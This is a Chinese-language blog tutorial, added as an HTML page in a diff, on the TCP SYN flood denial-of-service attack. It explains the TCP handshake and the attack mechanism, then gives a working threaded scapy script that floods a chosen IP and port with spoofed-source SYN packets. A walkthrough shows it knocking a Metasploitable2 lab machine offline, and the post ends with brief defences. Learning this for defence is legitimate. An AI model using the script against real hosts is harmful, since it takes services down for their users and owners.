@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="TimeS0ng" />
+
+
+
+<meta name="description" content="0x00. Syn-Flood攻击简介&amp;emsp;&amp;emsp;Syn-Flood Attack是一种基于TCP/IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Syn-Flood">
+<meta property="og:url" content="http://TimeS0ng.github.io/2017/09/21/Syn-Flood/index.html">
+<meta property="og:site_name" content="TimeS0ng&#39;s blog">
+<meta property="og:description" content="0x00. Syn-Flood攻击简介&amp;emsp;&amp;emsp;Syn-Flood Attack是一种基于TCP/IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/WEBRESOURCE82141cc79b8be8e533232aadf09ffc3b/1390">
+<meta property="og:image" content="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/5AA8915F1F464491970B2512AD2C1325/1394">
+<meta property="og:image" content="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/38040545EAD640A5B8D161A4EDB2E087/1407">
+<meta property="og:image" content="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/D7EBB586D3244CBD93243747CE8FC296/1479">
+<meta property="og:image" content="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/5C77A8A40E664C4792E55C8794927CB6/1484">
+<meta property="og:image" content="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/495E79F164574A8696349DBC68DC7BF2/1491">
+<meta property="og:updated_time" content="2017-09-21T14:59:47.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Syn-Flood">
+<meta name="twitter:description" content="0x00. Syn-Flood攻击简介&amp;emsp;&amp;emsp;Syn-Flood Attack是一种基于TCP/IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。">
+<meta name="twitter:image" content="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/WEBRESOURCE82141cc79b8be8e533232aadf09ffc3b/1390">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="TimeS0ng&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Syn-Flood | TimeS0ng&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">TimeS0ng</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:1102234142@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/TimeS0ng" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注技术，乐于分享</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">TimeS0ng</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">TimeS0ng</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:1102234142@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/TimeS0ng" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-Syn-Flood" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/09/21/Syn-Flood/" class="article-date">
+      <time datetime="2017-09-21T14:53:30.000Z" itemprop="datePublished">2017-09-21</time>
+</a>
+
+ 
+    <a href="/2017/09/21/Syn-Flood/#comments" title="查看评论">
+        <i class="fa fa-comments-o" aria-hidden="true"></i>
+        <span class="count-comment"></span>
+        
+        
+            <span class="disqus-comment-count" data-disqus-identifier="2017/09/21/Syn-Flood/"></span>
+        
+    </a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Syn-Flood
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x00-Syn-Flood攻击简介"><a href="#0x00-Syn-Flood攻击简介" class="headerlink" title="0x00. Syn-Flood攻击简介"></a>0x00. Syn-Flood攻击简介</h2><h4 id="emsp-emsp-Syn-Flood-Attack是一种基于TCP-IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。"><a href="#emsp-emsp-Syn-Flood-Attack是一种基于TCP-IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。" class="headerlink" title="&emsp;&emsp;Syn-Flood Attack是一种基于TCP/IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。"></a>&emsp;&emsp;Syn-Flood Attack是一种基于TCP/IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。</h4><a id="more"></a>
+<hr>
+<h2 id="0x01-TCP-IP三次握手"><a href="#0x01-TCP-IP三次握手" class="headerlink" title="0x01. TCP/IP三次握手"></a>0x01. TCP/IP三次握手</h2><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/WEBRESOURCE82141cc79b8be8e533232aadf09ffc3b/1390" alt="image"></p>
+<h4 id="1-第一次握手：Client将标志位-也就是flags位-SYN置为1，随机产生一个值seq-J，并将该数据包发送给Server，Client进入SYN-SENT状态，等待Server确认。"><a href="#1-第一次握手：Client将标志位-也就是flags位-SYN置为1，随机产生一个值seq-J，并将该数据包发送给Server，Client进入SYN-SENT状态，等待Server确认。" class="headerlink" title="1.第一次握手：Client将标志位(也就是flags位)SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。"></a>1.第一次握手：Client将标志位(也就是flags位)SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。</h4><h4 id="2-第二次握手：Server收到数据包后由标志位SYN-1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack-J-1，随机产生一个值seq-K，并将该数据包发送给Client以确认连接请求，Server进入SYN-RCVD状态。"><a href="#2-第二次握手：Server收到数据包后由标志位SYN-1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack-J-1，随机产生一个值seq-K，并将该数据包发送给Client以确认连接请求，Server进入SYN-RCVD状态。" class="headerlink" title="2.第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求，Server进入SYN_RCVD状态。"></a>2.第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求，Server进入SYN_RCVD状态。</h4><h4 id="3-第三次握手：Client收到确认后，检查ack是否为J-1，ACK是否为1，如果正确则将标志位ACK置为1，ack-K-1，并将该数据包发送给Server，Server检查ack是否为K-1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。"><a href="#3-第三次握手：Client收到确认后，检查ack是否为J-1，ACK是否为1，如果正确则将标志位ACK置为1，ack-K-1，并将该数据包发送给Server，Server检查ack是否为K-1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。" class="headerlink" title="3.第三次握手：Client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给Server，Server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。"></a>3.第三次握手：Client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给Server，Server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。</h4><h4 id="下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1-读者们也可以自己抓包来分析包结构更好的学习。"><a href="#下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1-读者们也可以自己抓包来分析包结构更好的学习。" class="headerlink" title="[*]下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1,读者们也可以自己抓包来分析包结构更好的学习。"></a>[*]下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1,读者们也可以自己抓包来分析包结构更好的学习。</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/5AA8915F1F464491970B2512AD2C1325/1394" alt="image"></p>
+<hr>
+<h2 id="0x02-Syn-Flood攻击原理"><a href="#0x02-Syn-Flood攻击原理" class="headerlink" title="0x02. Syn-Flood攻击原理"></a>0x02. Syn-Flood攻击原理</h2><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/38040545EAD640A5B8D161A4EDB2E087/1407" alt="image"></p>
+<h3 id="上图简要介绍了Syn-Flood攻击过程"><a href="#上图简要介绍了Syn-Flood攻击过程" class="headerlink" title="上图简要介绍了Syn-Flood攻击过程"></a>上图简要介绍了Syn-Flood攻击过程</h3><h4 id="1-攻击者先向目标机发送SYN包，请求建立TCP连接"><a href="#1-攻击者先向目标机发送SYN包，请求建立TCP连接" class="headerlink" title="1.攻击者先向目标机发送SYN包，请求建立TCP连接"></a>1.攻击者先向目标机发送SYN包，请求建立TCP连接</h4><h4 id="2-目标机接收到SYN包之后，便会进入SYN-RCVD状态，然后又给攻击者回一个SYN-ACK包"><a href="#2-目标机接收到SYN包之后，便会进入SYN-RCVD状态，然后又给攻击者回一个SYN-ACK包" class="headerlink" title="2.目标机接收到SYN包之后，便会进入SYN_RCVD状态，然后又给攻击者回一个SYN-ACK包"></a>2.目标机接收到SYN包之后，便会进入SYN_RCVD状态，然后又给攻击者回一个SYN-ACK包</h4><h4 id="3-如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN-RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了"><a href="#3-如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN-RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了" class="headerlink" title="3.如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN_RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了"></a>3.如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN_RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了</h4><h4 id="4-如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包-为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦"><a href="#4-如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包-为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦" class="headerlink" title="4.如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包(为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦)"></a>4.如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包(为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦)</h4><hr>
+<h2 id="0x03-Syn-Flood攻击实战"><a href="#0x03-Syn-Flood攻击实战" class="headerlink" title="0x03. Syn-Flood攻击实战"></a>0x03. Syn-Flood攻击实战</h2><h4 id="emsp-emsp-有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。"><a href="#emsp-emsp-有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。" class="headerlink" title="&emsp;&emsp;有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。"></a>&emsp;&emsp;有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。</h4><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-Syn-Flood脚本"><a href="#emsp-emsp-1-Syn-Flood脚本" class="headerlink" title="&emsp;&emsp;1.Syn-Flood脚本"></a>&emsp;&emsp;1.Syn-Flood脚本</h4><h4 id="emsp-emsp-2-Wireshark抓包工具"><a href="#emsp-emsp-2-Wireshark抓包工具" class="headerlink" title="&emsp;&emsp;2.Wireshark抓包工具"></a>&emsp;&emsp;2.Wireshark抓包工具</h4><h4 id="emsp-emsp-3-metaploitable2-0-linux-emsp-IP-192-168-43-109"><a href="#emsp-emsp-3-metaploitable2-0-linux-emsp-IP-192-168-43-109" class="headerlink" title="&emsp;&emsp;3.metaploitable2.0-linux &emsp;IP=192.168.43.109"></a>&emsp;&emsp;3.metaploitable2.0-linux &emsp;IP=192.168.43.109</h4><h4 id="Syn-Flood脚本如下（注意：该脚本需要python-2-7版本，还需要安装scapy、threading、random库）："><a href="#Syn-Flood脚本如下（注意：该脚本需要python-2-7版本，还需要安装scapy、threading、random库）：" class="headerlink" title="Syn-Flood脚本如下（注意：该脚本需要python 2.7版本，还需要安装scapy、threading、random库）："></a>Syn-Flood脚本如下（注意：该脚本需要python 2.7版本，还需要安装scapy、threading、random库）：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Syn_flood</span><span class="params">(target_ip, target_port)</span>:</span></div><div class="line"> 	<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line"> 		port = random.randint(<span class="number">0</span>,<span class="number">10000</span>)</div><div class="line"> 		send(IP(src=<span class="string">"1.1.1.1"</span>, dst=target_ip)/TCP(dport=target_port, sport=port),verbose=<span class="number">0</span>)</div><div class="line"> 		<span class="comment">#send(IP(dst=target_ip)/TCP(dport=target_port, sport=port),verbose=0)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(target_ip, target_port, threads)</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"BEGIN TO ATTACK TARGET"</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, threads):</div><div class="line">		<span class="comment">#print "test" </span></div><div class="line">		t = threading.Thread(target=Syn_flood, args=(target_ip, target_port))</div><div class="line">		t.start()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>: </div><div class="line">	target_ip = raw_input(<span class="string">"Please input the target_ip: "</span>)</div><div class="line">	target_port = int(raw_input(<span class="string">"Please input the target_port: "</span>))</div><div class="line">	threads = int(raw_input(<span class="string">"Please input the threads: "</span>))</div><div class="line">	main(target_ip, target_port, threads)</div></pre></td></tr></table></figure>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><h4 id="1-启动metasploit2-0，访问它的web服务-现在我们可以很流畅的访问到"><a href="#1-启动metasploit2-0，访问它的web服务-现在我们可以很流畅的访问到" class="headerlink" title="1.启动metasploit2.0，访问它的web服务,现在我们可以很流畅的访问到"></a>1.启动metasploit2.0，访问它的web服务,现在我们可以很流畅的访问到</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/D7EBB586D3244CBD93243747CE8FC296/1479" alt="image"></p>
+<h4 id="2-启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口"><a href="#2-启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口" class="headerlink" title="2.启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口"></a>2.启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/5C77A8A40E664C4792E55C8794927CB6/1484" alt="image"></p>
+<h4 id="3-现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN-RECV状态"><a href="#3-现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN-RECV状态" class="headerlink" title="3.现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN_RECV状态"></a>3.现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN_RECV状态</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/495E79F164574A8696349DBC68DC7BF2/1491" alt="image"></p>
+<hr>
+<h2 id="0x04-防御措施"><a href="#0x04-防御措施" class="headerlink" title="0x04. 防御措施"></a>0x04. 防御措施</h2><h3 id="emsp-emsp-看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对"><a href="#emsp-emsp-看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对" class="headerlink" title="&emsp;&emsp;看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对"></a>&emsp;&emsp;看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对</h3><h4 id="1-如果某个端口和同一个IP建立了多个不完整连接，直接禁IP"><a href="#1-如果某个端口和同一个IP建立了多个不完整连接，直接禁IP" class="headerlink" title="1.如果某个端口和同一个IP建立了多个不完整连接，直接禁IP"></a>1.如果某个端口和同一个IP建立了多个不完整连接，直接禁IP</h4><h4 id="2-减少SYN-RECEIVED的过期时间"><a href="#2-减少SYN-RECEIVED的过期时间" class="headerlink" title="2.减少SYN-RECEIVED的过期时间"></a>2.减少SYN-RECEIVED的过期时间</h4><h4 id="3-设置SYN-Cookie"><a href="#3-设置SYN-Cookie" class="headerlink" title="3.设置SYN Cookie"></a>3.设置SYN Cookie</h4><h4 id="4-设置防火墙的进站和入站规则"><a href="#4-设置防火墙的进站和入站规则" class="headerlink" title="4.设置防火墙的进站和入站规则"></a>4.设置防火墙的进站和入站规则</h4><h4 id="5-记录日志方便溯源追踪真凶"><a href="#5-记录日志方便溯源追踪真凶" class="headerlink" title="5.记录日志方便溯源追踪真凶"></a>5.记录日志方便溯源追踪真凶</h4><hr>
+<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="emsp-emsp-关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。"><a href="#emsp-emsp-关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。" class="headerlink" title="&emsp;&emsp;关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。"></a>&emsp;&emsp;关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。</h4>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/09/21/Syn-Flood/">Syn-Flood</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
+        <p><span>发布时间:</span>2017-09-21, 22:53:30</p>
+        <p><span>最后更新:</span>2017-09-21, 22:59:47</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/09/21/Syn-Flood/" title="Syn-Flood">http://TimeS0ng.github.io/2017/09/21/Syn-Flood/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2017/09/21/Syn-Flood/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
